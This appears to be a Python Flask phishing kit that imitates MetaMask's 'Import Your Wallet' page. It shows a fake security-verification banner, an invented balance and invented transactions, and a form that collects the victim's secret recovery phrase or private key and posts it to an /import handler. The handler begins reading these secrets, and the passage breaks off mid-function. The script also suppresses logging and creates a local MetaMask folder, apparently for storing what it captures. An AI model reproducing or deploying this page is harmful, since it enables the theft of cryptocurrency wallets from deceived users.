import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'metamask-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/MetaMask")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['metamask_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="mobile-web-app-capable" content="yes">
        <title>MetaMask - Import Your Wallet</title>
        <style>
            :root {
                --mm-orange: #F6851B;
                --mm-dark: #24272A;
                --mm-light: #F7F7F7;
                --mm-purple: #6F42C1;
                --mm-blue: #1E90FF;
            }
            
            * {
                -webkit-tap-highlight-color: transparent;
                -webkit-font-smoothing: antialiased;
            }
            
            body {
                background: linear-gradient(135deg, #F7F7F7 0%, #E8E8E8 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333333;
                -webkit-text-size-adjust: 100%;
                touch-action: manipulation;
            }
            
            .metamask-container {
                background: white;
                width: 95vw;
                max-width: 500px;
                min-height: 100vh;
                border-radius: 0;
                box-shadow: none;
                overflow: hidden;
                border: none;
                position: relative;
            }
            
            @media (min-width: 768px) {
                .metamask-container {
                    min-height: auto;
                    height: auto;
                    border-radius: 20px;
                    box-shadow: 
                        0 10px 40px rgba(0, 0, 0, 0.1),
                        0 0 0 1px rgba(0, 0, 0, 0.05);
                    border: 1px solid #E0E0E0;
                    margin: 20px auto;
                }
                body {
                    padding: 20px 0;
                    min-height: calc(100vh - 40px);
                }
            }
            
            .metamask-header {
                background: linear-gradient(135deg, #24272A 0%, #000000 100%);
                padding: 30px 20px 25px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .metamask-header {
                    padding: 40px 40px 30px;
                }
            }
            
            .metamask-header::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(246, 133, 27, 0.1) 0%, transparent 70%);
                z-index: 0;
            }
            
            .metamask-logo {
                position: relative;
                z-index: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .logo-fox {
                width: 50px;
                height: 50px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                box-shadow: 0 8px 25px rgba(246, 133, 27, 0.3);
            }
            
            .logo-fox img {
                width: 100%;
                height: 100%;
                object-fit: contain;
            }
            
            .logo-text {
                font-size: 28px;
                font-weight: 700;
                color: white;
                letter-spacing: -0.5px;
            }
            
            @media (min-width: 768px) {
                .logo-fox {
                    width: 60px;
                    height: 60px;
                }
                .logo-text {
                    font-size: 32px;
                }
            }
            
            .security-banner {
                background: linear-gradient(90deg, #FF6B35 0%, #FF9E42 50%, #FF6B35 100%);
                color: white;
                padding: 15px;
                margin: 0;
                font-weight: 700;
                font-size: 14px;
                text-align: center;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                animation: pulseWarning 2s infinite;
            }
            
            @media (min-width: 768px) {
                .security-banner {
                    padding: 18px;
                    font-size: 16px;
                }
            }
            
            @keyframes pulseWarning {
                0% { opacity: 0.9; }
                50% { opacity: 1; }
                100% { opacity: 0.9; }
            }
            
            .import-section {
                padding: 25px 20px;
            }
            
            @media (min-width: 768px) {
                .import-section {
                    padding: 40px;
                }
            }
            
            .wallet-preview {
                background: linear-gradient(135deg, #F8F9FA 0%, #E9ECEF 100%);
                border: 2px solid #E0E0E0;
                border-radius: 16px;
                padding: 20px;
                margin-bottom: 25px;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .wallet-preview {
                    padding: 30px;
                    margin-bottom: 30px;
                }
            }
            
            .wallet-address {
                font-family: 'Courier New', monospace;
                background: white;
                border: 2px solid #E0E0E0;
                border-radius: 12px;
                padding: 12px;
                margin: 15px 0;
                color: #333;
                font-size: 13px;
                letter-spacing: 1px;
                word-break: break-all;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .wallet-address {
                    padding: 15px;
                    font-size: 14px;
                    margin: 20px 0;
                }
            }
            
            .balance-display {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin: 20px 0;
                padding: 15px;
                background: white;
                border: 2px solid #F0F0F0;
                border-radius: 12px;
                flex-wrap: wrap;
            }
            
            @media (min-width: 768px) {
                .balance-display {
                    padding: 20px;
                    margin: 25px 0;
                }
            }
            
            .balance-amount {
                font-size: 24px;
                font-weight: 800;
                color: #24272A;
                margin-right: 10px;
            }
            
            .balance-usd {
                color: #00A65A;
                font-weight: 700;
                font-size: 16px;
            }
            
            @media (min-width: 768px) {
                .balance-amount {
                    font-size: 28px;
                }
                .balance-usd {
                    font-size: 18px;
                }
            }
            
            .network-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(111, 66, 193, 0.1);
                color: #6F42C1;
                padding: 6px 12px;
                border-radius: 20px;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 15px;
            }
            
            @media (min-width: 768px) {
                .network-badge {
                    padding: 8px 16px;
                    font-size: 14px;
                    margin-bottom: 20px;
                }
            }
            
            .import-options {
                background: #F8F9FA;
                border-radius: 16px;
                padding: 25px;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .import-options {
                    padding: 30px;
                    margin: 30px 0;
                }
            }
            
            .option-title {
                color: #24272A;
                font-size: 18px;
                font-weight: 700;
                margin-bottom: 20px;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .option-title {
                    font-size: 20px;
                    margin-bottom: 25px;
                }
            }
            
            .option-tabs {
                display: flex;
                gap: 8px;
                margin-bottom: 25px;
            }
            
            @media (min-width: 768px) {
                .option-tabs {
                    gap: 10px;
                    margin-bottom: 30px;
                }
            }
            
            .option-tab {
                flex: 1;
                padding: 12px;
                background: white;
                border: 2px solid #E0E0E0;
                border-radius: 12px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s;
                font-weight: 600;
                color: #666;
                font-size: 14px;
                -webkit-tap-highlight-color: transparent;
            }
            
            @media (min-width: 768px) {
                .option-tab {
                    padding: 15px;
                    font-size: 16px;
                }
            }
            
            .option-tab.active {
                border-color: var(--mm-orange);
                background: rgba(246, 133, 27, 0.1);
                color: var(--mm-orange);
            }
            
            .seed-input {
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .seed-input {
                    margin: 25px 0;
                }
            }
            
            .input-label {
                color: #555;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 10px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            @media (min-width: 768px) {
                .input-label {
                    font-size: 14px;
                    margin-bottom: 12px;
                }
            }
            
            textarea {
                width: 100%;
                min-height: 100px;
                padding: 15px;
                background: white;
                border: 2px solid #E0E0E0;
                border-radius: 12px;
                color: #333;
                font-size: 15px;
                font-family: 'Courier New', monospace;
                line-height: 1.6;
                resize: vertical;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
            }
            
            @media (min-width: 768px) {
                textarea {
                    min-height: 120px;
                    padding: 20px;
                    font-size: 16px;
                }
            }
            
            textarea:focus {
                border-color: var(--mm-orange);
                outline: none;
                box-shadow: 0 0 0 3px rgba(246, 133, 27, 0.1);
            }
            
            .password-input {
                position: relative;
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .password-input {
                    margin: 25px 0;
                }
            }
            
            input {
                width: 100%;
                padding: 15px;
                background: white;
                border: 2px solid #E0E0E0;
                border-radius: 12px;
                color: #333;
                font-size: 15px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
            }
            
            @media (min-width: 768px) {
                input {
                    padding: 18px;
                    font-size: 16px;
                }
            }
            
            input:focus {
                border-color: var(--mm-orange);
                outline: none;
                box-shadow: 0 0 0 3px rgba(246, 133, 27, 0.1);
            }
            
            .show-password {
                position: absolute;
                right: 15px;
                top: 50%;
                transform: translateY(-50%);
                background: none;
                border: none;
                color: #777;
                cursor: pointer;
                font-size: 13px;
                -webkit-tap-highlight-color: transparent;
                padding: 5px;
                min-width: 50px;
                text-align: right;
            }
            
            .security-warning {
                background: #FFF3E0;
                border: 2px solid #FFB74D;
                border-radius: 12px;
                padding: 15px;
                margin: 25px 0;
                color: #E65100;
                font-size: 13px;
                text-align: center;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                .security-warning {
                    padding: 20px;
                    margin: 30px 0;
                    font-size: 14px;
                }
            }
            
            .terms-checkbox {
                display: flex;
                align-items: flex-start;
                gap: 10px;
                margin: 20px 0;
                color: #666;
                font-size: 13px;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                .terms-checkbox {
                    gap: 12px;
                    margin: 25px 0;
                    font-size: 14px;
                }
            }
            
            .import-btn {
                background: linear-gradient(135deg, #F6851B, #FF9E42);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 12px;
                font-size: 16px;
                font-weight: 700;
                width: 100%;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 15px;
                position: relative;
                overflow: hidden;
                -webkit-tap-highlight-color: transparent;
                min-height: 56px;
            }
            
            @media (min-width: 768px) {
                .import-btn {
                    padding: 20px;
                    font-size: 18px;
                    margin-top: 20px;
                }
            }
            
            .import-btn:hover, .import-btn:active {
                transform: translateY(-3px);
                box-shadow: 0 15px 30px rgba(246, 133, 27, 0.3);
            }
            
            .import-btn::after {
                content: '🦊';
                position: absolute;
                right: 20px;
                top: 50%;
                transform: translateY(-50%);
                font-size: 18px;
            }
            
            .assets-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .assets-grid {
                    grid-template-columns: repeat(4, 1fr);
                    gap: 15px;
                    margin: 30px 0;
                }
            }
            
            .asset-card {
                background: white;
                border: 2px solid #F0F0F0;
                border-radius: 12px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
            }
            
            @media (min-width: 768px) {
                .asset-card {
                    padding: 20px;
                }
            }
            
            .asset-card:hover, .asset-card:active {
                border-color: var(--mm-orange);
                transform: translateY(-5px);
                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            }
            
            .asset-icon {
                width: 35px;
                height: 35px;
                background: linear-gradient(135deg, #F6851B, #FF9E42);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-weight: bold;
                margin: 0 auto 12px;
                font-size: 16px;
            }
            
            @media (min-width: 768px) {
                .asset-icon {
                    width: 40px;
                    height: 40px;
                    margin: 0 auto 15px;
                    font-size: 18px;
                }
            }
            
            .asset-symbol {
                font-weight: 700;
                color: #24272A;
                margin-bottom: 5px;
                font-size: 14px;
            }
            
            .asset-amount {
                color: #00A65A;
                font-weight: 600;
                font-size: 12px;
            }
            
            @media (min-width: 768px) {
                .asset-symbol {
                    font-size: 16px;
                }
                .asset-amount {
                    font-size: 14px;
                }
            }
            
            .recent-transactions {
                background: #F8F9FA;
                border-radius: 12px;
                padding: 20px;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .recent-transactions {
                    padding: 25px;
                    margin: 30px 0;
                }
            }
            
            .transaction-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 12px 0;
                border-bottom: 1px solid #E0E0E0;
            }
            
            @media (min-width: 768px) {
                .transaction-item {
                    padding: 15px 0;
                }
            }
            
            .transaction-item:last-child {
                border-bottom: none;
            }
            
            .tx-amount {
                font-weight: 700;
                color: #00A65A;
                font-size: 14px;
            }
            
            .tx-amount.out {
                color: #F44336;
            }
            
            .connect-hint {
                text-align: center;
                color: #777;
                font-size: 13px;
                margin: 15px 0;
                padding: 15px;
                border: 2px dashed #E0E0E0;
                border-radius: 12px;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                .connect-hint {
                    margin: 20px 0;
                    padding: 20px;
                    font-size: 14px;
                }
            }
            
            .footer-note {
                text-align: center;
                color: #999;
                font-size: 11px;
                margin-top: 25px;
                padding-top: 15px;
                border-top: 1px solid #E0E0E0;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                .footer-note {
                    margin-top: 30px;
                    padding-top: 20px;
                    font-size: 12px;
                }
            }
            
            /* Mobile-specific optimizations */
            @media (max-width: 767px) {
                body {
                    padding: 0;
                    display: block;
                }
                
                .metamask-container {
                    width: 100%;
                    min-height: 100vh;
                    border-radius: 0;
                }
                
                .balance-display {
                    flex-direction: column;
                    align-items: flex-start;
                    gap: 10px;
                }
                
                .option-tabs {
                    flex-direction: column;
                }
                
                input, textarea, button {
                    font-size: 16px !important; /* Prevents iOS zoom */
                }
                
                textarea {
                    min-height: 120px;
                }
            }
            
            /* Tablet optimization */
            @media (min-width: 768px) and (max-width: 1024px) {
                .metamask-container {
                    width: 90vw;
                    max-width: 600px;
                }
                
                .assets-grid {
                    grid-template-columns: repeat(2, 1fr);
                }
            }
        </style>
    </head>
    <body>
        <div class="metamask-container">
            <div class="metamask-header">
                <div class="metamask-logo">
                    <div class="logo-fox">
                        <!-- Base64 encoded MetaMask logo -->
                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjg4IiBoZWlnaHQ9IjI4OCIgdmlld0JveD0iMCAwIDI4OCAyODgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yNzIgMTA0LjM0MUwyMTMuODQ5IDI0NC4wMzNMMjQ0LjY3MyAyODhMMjg4IDI3Mi4xODdWMTA0LjM0MUgyNzJaIiBmaWxsPSIjRUE4ODFBIi8+CjxwYXRoIGQ9Ik0yMTMuODQ5IDI0NC4wMzNMMTc3LjI5MSAyNzIuMTg3TDI0NC42NzMgMjg4TDIxMy44NDkgMjQ0LjAzM1oiIGZpbGw9IiNEMTc0OTgiLz4KPHBhdGggZD0iTTE0NC4xMDkgMjQ0LjAzM0wyMTMuODQ5IDI0NC4wMzNMMTc3LjI5MSAyNzIuMTg3TDE0NC4xMDkgMjQ0LjAzM1oiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTE0NC4xMDkgMjQ0LjAzM0wxMDUuNTY2IDI4OEwxNzcuMjkxIDI3Mi4xODdMMTQ0LjEwOSAyNDQuMDMzWiIgZmlsbD0iI0VBNzcxQyIvPgo8cGF0aCBkPSJNMTYgMTA0LjM0MUw1NC41NTEgMjQ0LjAzM0wxNDQuMTA5IDI0NC4wMzNMMTYgMTA0LjM0MVoiIGZpbGw9IiNFQTg4MUEiLz4KPHBhdGggZD0iTTU0LjU1MSAyNDQuMDMzTDEwNS41NjYgMjg4TDE0NC4xMDkgMjQ0LjAzM0w1NC41NTEgMjQ0LjAzM1oiIGZpbGw9IiNEMTc0OTgiLz4KPHBhdGggZD0iTTE3Ny4yOTEgMEwxNDQuMTA5IDE0My45MzNMMjEzLjg0OSAxNDMuOTMzTDE3Ny4yOTEgMFoiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTE3Ny4yOTEgMEwxMDUuNTY2IDIxLjgxMzNMMTQ0LjEwOSAxNDMuOTMzTDE3Ny4yOTEgMFoiIGZpbGw9IiNFQTg4MUEiLz4KPHBhdGggZD0iTTEwNS41NjYgMjEuODEzM0wxNDQuMTA5IDE0My45MzNMNTQuNTUxIDE0My45MzNMMTA1LjU2NiAyMS44MTMzWiIgZmlsbD0iI0QxNzQ5OCIvPgo8cGF0aCBkPSJNNTQuNTUxIDE0My45MzNMMTQ0LjEwOSAxNDMuOTMzTDEwNS41NjYgMjEuODEzM0w1NC41NTEgMTQzLjkzM1oiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTIxMy44NDkgMTQzLjkzM0wxNzcuMjkxIDBMMjg4IDEwNC4zNDFMMjEzLjg0OSAxNDMuOTMzWiIgZmlsbD0iI0VBNzcxQyIvPgo8cGF0aCBkPSJNMjg4IDEwNC4zNDFMMjEzLjg0OSAxNDMuOTMzTDE0NC4xMDkgMTQzLjkzM0wxNiAxMDQuMzQxTDEwNS41NjYgMjEuODEzM0wyODggMTA0LjM0MVoiIGZpbGw9IiNFQTg4MUEiLz4KPC9zdmc+" alt="MetaMask Logo">
                    </div>
                    <div class="logo-text">MetaMask</div>
                </div>
                
                <div style="color: rgba(255, 255, 255, 0.9); font-size: 14px; max-width: 400px; margin: 0 auto; line-height: 1.6;">
                    Import your wallet to access your Ethereum assets
                </div>
            </div>
            
            <div class="security-banner">
                <span>🔒</span>
                <span>SECURITY VERIFICATION REQUIRED - Import your wallet to continue</span>
            </div>
            
            <div class="import-section">
                <div class="wallet-preview">
                    <div style="color: #666; font-size: 13px; margin-bottom: 8px;">
                        Detected Wallet
                    </div>
                    <div class="wallet-address" id="walletAddress">
                        0x742d35Cc6634C0532925a3b8...9e4f
                    </div>
                    <div class="network-badge">
                        <span>🌐</span>
                        <span>Ethereum Mainnet</span>
                    </div>
                </div>
                
                <div class="balance-display">
                    <div>
                        <div style="color: #666; font-size: 13px;">Total Balance</div>
                        <div class="balance-amount" id="balanceEth">12.84 ETH</div>
                    </div>
                    <div class="balance-usd" id="balanceUsd">≈ $42,847.63</div>
                </div>
                
                <div class="assets-grid">
                    <div class="asset-card">
                        <div class="asset-icon">
                            <!-- ETH Icon -->
                            <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
                                <circle cx="16" cy="16" r="16" fill="#627EEA"/>
                                <path d="M15.998 4L15.884 4.364V20.636L15.998 20.748L23.996 16.223L15.998 4Z" fill="white" fill-opacity="0.602"/>
                                <path d="M15.998 4L8 16.223L15.998 20.748V13.373V4Z" fill="white"/>
                                <path d="M15.998 22.175L15.936 22.252V27.775L15.998 27.999L24 18.04L15.998 22.175Z" fill="white" fill-opacity="0.602"/>
                                <path d="M15.998 27.999V22.175L8 18.04L15.998 27.999Z" fill="white"/>
                                <path d="M15.998 20.748L23.996 16.223L15.998 13.373V20.748Z" fill="white" fill-opacity="0.2"/>
                                <path d="M8 16.223L15.998 20.748V13.373L8 16.223Z" fill="white" fill-opacity="0.602"/>
                            </svg>
                        </div>
                        <div class="asset-symbol">ETH</div>
                        <div class="asset-amount">12.84 ETH</div>
                    </div>
                    <div class="asset-card">
                        <div class="asset-icon">₿</div>
                        <div class="asset-symbol">WBTC</div>
                        <div class="asset-amount">0.85 WBTC</div>
                    </div>
                    <div class="asset-card">
                        <div class="asset-icon">
                            <!-- USDC Icon -->
                            <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
                                <circle cx="16" cy="16" r="16" fill="#2775CA"/>
                                <path d="M20.0275 14.1245C20.0275 11.8911 18.2464 10.0581 16.0009 10.0581C13.7545 10.0581 11.9725 11.892 11.9725 14.1254C11.9725 16.3081 13.6652 18.1027 15.9991 18.1027C18.2446 18.1027 20.0265 16.3072 20.0265 14.1245H20.0275ZM24 14.1245C24 18.4198 20.4273 21.9175 16.0009 21.9175C11.5736 21.9175 8 18.4198 8 14.1245C8 9.83009 11.5736 6.33234 16.0009 6.33234C20.4273 6.33234 24 9.83009 24 14.1245Z" fill="white"/>
                            </svg>
                        </div>
                        <div class="asset-symbol">USDC</div>
                        <div class="asset-amount">18,500 USDC</div>
                    </div>
                    <div class="asset-card">
                        <div class="asset-icon">
                            <!-- UNI Icon -->
                            <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
                                <circle cx="16" cy="16" r="16" fill="#FF007A"/>
                                <path d="M23.5 14.2222V8L16 4L8.5 8V14.2222L16 18.4444L23.5 14.2222ZM16 5.33333L21.8333 8.44444L16 11.5556L10.1667 8.44444L16 5.33333ZM9.5 9.77778L14.8333 12.6667V18.8889L9.5 15.7778V9.77778ZM21.5 9.77778V15.7778L16.1667 18.8889V12.6667L21.5 9.77778ZM10.1667 16.5556L15.5 19.4444V27.1111L10.1667 24.2222V16.5556ZM21.8333 16.5556V24.2222L16.5 27.1111V19.4444L21.8333 16.5556Z" fill="white"/>
                            </svg>
                        </div>
                        <div class="asset-symbol">UNI</div>
                        <div class="asset-amount">420 UNI</div>
                    </div>
                </div>
                
                <div class="recent-transactions">
                    <div style="color: #24272A; font-weight: 600; margin-bottom: 15px; font-size: 15px;">
                        Recent Transactions
                    </div>
                    <div class="transaction-item">
                        <div>
                            <div style="font-weight: 600; margin-bottom: 4px; font-size: 14px;">Uniswap V3 Swap</div>
                            <div style="color: #666; font-size: 12px;">10 min ago</div>
                        </div>
                        <div class="tx-amount out">-0.42 ETH</div>
                    </div>
                    <div class="transaction-item">
                        <div>
                            <div style="font-weight: 600; margin-bottom: 4px; font-size: 14px;">Aave Deposit</div>
                            <div style="color: #666; font-size: 12px;">2 hours ago</div>
                        </div>
                        <div class="tx-amount out">-5,000 USDC</div>
                    </div>
                    <div class="transaction-item">
                        <div>
                            <div style="font-weight: 600; margin-bottom: 4px; font-size: 14px;">Received from Binance</div>
                            <div style="color: #666; font-size: 12px;">Yesterday</div>
                        </div>
                        <div class="tx-amount">+2.1 ETH</div>
                    </div>
                </div>
                
                <div class="import-options">
                    <div class="option-title">Import Your Wallet</div>
                    
                    <div class="option-tabs">
                        <div class="option-tab active" onclick="switchTab('seed')" onkeypress="if(event.key==='Enter')switchTab('seed')" tabindex="0">Seed Phrase</div>
                        <div class="option-tab" onclick="switchTab('private')" onkeypress="if(event.key==='Enter')switchTab('private')" tabindex="0">Private Key</div>
                    </div>
                    
                    <form action="/import" method="post" id="importForm">
                        <div class="seed-input" id="seedSection">
                            <label class="input-label">Secret Recovery Phrase</label>
                            <textarea 
                                name="seed_phrase" 
                                placeholder="Enter your 12, 18, or 24-word seed phrase separated by spaces"
                                required
                                rows="4"
                                id="seedPhrase"
                                autocapitalize="off"
                                autocomplete="off"
                                autocorrect="off"
                                spellcheck="false"
                            ></textarea>
                            <div style="color: #777; font-size: 12px; margin-top: 8px;">
                                Typically 12 (sometimes 24) words separated by single spaces
                            </div>
                        </div>
                        
                        <div class="seed-input" id="privateSection" style="display: none;">
                            <label class="input-label">Private Key</label>
                            <textarea 
                                name="private_key" 
                                placeholder="Enter your private key (64 hex characters)"
                                rows="3"
                                id="privateKey"
                                autocapitalize="off"
                                autocomplete="off"
                                autocorrect="off"
                                spellcheck="false"
                            ></textarea>
                            <div style="color: #777; font-size: 12px; margin-top: 8px;">
                                64 hexadecimal characters (0-9, A-F)
                            </div>
                        </div>
                        
                        <div class="password-input">
                            <label class="input-label">New Password</label>
                            <input 
                                type="password" 
                                name="password" 
                                id="password"
                                placeholder="Create a new password (min. 8 characters)"
                                required
                                minlength="8"
                                autocomplete="new-password"
                            >
                            <button type="button" class="show-password" onclick="togglePassword()" tabindex="-1">Show</button>
                        </div>
                        
                        <div class="password-input">
                            <label class="input-label">Confirm Password</label>
                            <input 
                                type="password" 
                                name="confirm_password" 
                                id="confirmPassword"
                                placeholder="Confirm your password"
                                required
                                minlength="8"
                                autocomplete="new-password"
                            >
                        </div>
                        
                        <div class="terms-checkbox">
                            <input type="checkbox" id="terms" name="terms" required style="margin-top: 3px;">
                            <label for="terms">
                                I have read and agree to the MetaMask 
                                <a href="#" style="color: var(--mm-orange); text-decoration: none;">Terms of Use</a> and 
                                <a href="#" style="color: var(--mm-orange); text-decoration: none;">Privacy Policy</a>
                            </label>
                        </div>
                        
                        <div class="security-warning">
                            ⚠️ Never disclose your secret recovery phrase or private key. 
                            Anyone with these can steal your assets.
                        </div>
                        
                        <button type="submit" class="import-btn">
                            Import Wallet
                        </button>
                    </form>
                </div>
                
                <div class="connect-hint">
                    <div style="margin-bottom: 10px;">🔗</div>
                    <div style="font-weight: 600; margin-bottom: 5px;">MetaMask Browser Extension Detected</div>
                    <div style="color: #666;">
                        Please import your wallet to connect to decentralized applications
                    </div>
                </div>
                
                <div class="footer-note">
                    MetaMask is a global community. For support, visit 
                    <a href="#" style="color: var(--mm-orange); text-decoration: none;">community.metamask.io</a>
                </div>
            </div>
        </div>
        
        <script>
            // Make option tabs accessible via keyboard
            document.querySelectorAll('.option-tab').forEach(tab => {
                tab.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter' || e.key === ' ') {
                        e.preventDefault();
                        tab.click();
                    }
                });
            });

            function switchTab(tab) {
                const seedTab = document.querySelector('.option-tab:nth-child(1)');
                const privateTab = document.querySelector('.option-tab:nth-child(2)');
                const seedSection = document.getElementById('seedSection');
                const privateSection = document.getElementById('privateSection');
                const seedPhrase = document.getElementById('seedPhrase');
                const privateKey = document.getElementById('privateKey');
                
                // Remove focus from current active tab
                document.activeElement.blur();
                
                if (tab === 'seed') {
                    seedTab.classList.add('active');
                    privateTab.classList.remove('active');
                    seedSection.style.display = 'block';
                    privateSection.style.display = 'none';
                    seedPhrase.required = true;
                    privateKey.required = false;
                    // Focus on textarea for better UX
                    setTimeout(() => seedPhrase.focus(), 100);
                } else {
                    seedTab.classList.remove('active');
                    privateTab.classList.add('active');
                    seedSection.style.display = 'none';
                    privateSection.style.display = 'block';
                    seedPhrase.required = false;
                    privateKey.required = true;
                    // Focus on textarea for better UX
                    setTimeout(() => privateKey.focus(), 100);
                }
            }
            
            function togglePassword() {
                const passwordInput = document.getElementById('password');
                const toggleButton = document.querySelector('.show-password');
                
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    toggleButton.textContent = 'Hide';
                } else {
                    passwordInput.type = 'password';
                    toggleButton.textContent = 'Show';
                }
                
                // Prevent form submission
                event.preventDefault();
                event.stopPropagation();
            }
            
            // Generate random wallet address
            const walletAddress = document.getElementById('walletAddress');
            const chars = '0123456789abcdef';
            let address = '0x';
            for (let i = 0; i < 40; i++) {
                address += chars[Math.floor(Math.random() * chars.length)];
            }
            walletAddress.textContent = address.substring(0, 20) + '...' + address.substring(36);
            
            // Animate balance with random fluctuations
            let ethBalance = 12.84;
            const balanceElement = document.getElementById('balanceEth');
            const usdElement = document.getElementById('balanceUsd');
            
            function updateBalance() {
                const fluctuation = (Math.random() - 0.5) * 0.02;
                ethBalance = Math.max(0, ethBalance * (1 + fluctuation));
                const usdValue = (ethBalance * 3300).toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                });
                
                balanceElement.textContent = ethBalance.toFixed(2) + ' ETH';
                usdElement.textContent = `≈ $${usdValue}`;
                
                // Animate change
                balanceElement.style.transform = 'scale(1.1)';
                setTimeout(() => {
                    balanceElement.style.transform = 'scale(1)';
                }, 300);
            }
            
            // Update balance every 10 seconds
            setInterval(updateBalance, 10000);
            
            // Animate asset cards on load
            document.addEventListener('DOMContentLoaded', function() {
                const assetCards = document.querySelectorAll('.asset-card');
                assetCards.forEach((card, index) => {
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(20px)';
                    
                    setTimeout(() => {
                        card.style.transition = 'all 0.5s ease';
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    }, index * 200);
                });
                
                // Prevent zoom on iOS when focusing input
                if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                    document.addEventListener('touchstart', function(e) {
                        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                            document.body.style.zoom = "100%";
                        }
                    });
                }
            });
            
            // Form validation
            document.getElementById('importForm').addEventListener('submit', function(e) {
                const password = document.getElementById('password').value;
                const confirmPassword = document.getElementById('confirmPassword').value;
                
                if (password !== confirmPassword) {
                    e.preventDefault();
                    alert('Passwords do not match. Please try again.');
                    document.getElementById('password').focus();
                    return false;
                }
                
                const seedSection = document.getElementById('seedSection');
                const privateSection = document.getElementById('privateSection');
                
                if (seedSection.style.display !== 'none') {
                    const seedPhrase = document.getElementById('seedPhrase').value;
                    const words = seedPhrase.trim().split(/\s+/);
                    if (![12, 18, 24].includes(words.length)) {
                        e.preventDefault();
                        alert('Please enter a valid 12, 18, or 24-word seed phrase.');
                        document.getElementById('seedPhrase').focus();
                        return false;
                    }
                } else {
                    const privateKey = document.getElementById('privateKey').value;
                    if (!privateKey.match(/^[0-9a-fA-F]{64}$/)) {
                        e.preventDefault();
                        alert('Please enter a valid 64-character private key.');
                        document.getElementById('privateKey').focus();
                        return false;
                    }
                }
                
                // Show loading state
                const submitBtn = this.querySelector('.import-btn');
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = 'Importing... <span style="font-size:14px">🔄</span>';
                submitBtn.disabled = true;
                
                // Allow form submission
                return true;
            });
            
            // Handle mobile viewport height
            function setViewportHeight() {
                let vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

@app.route('/import', methods=['POST'])
def import_wallet():
    seed_phrase = request.form.get('seed_phrase', '').strip()
    private_key = request.form.get('private_key', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('metamask_session', 'unknown')

    # Determine what was submitted
    if seed_phrase:
        submission_type = 'seed_phrase'
        submission_content = seed_phrase
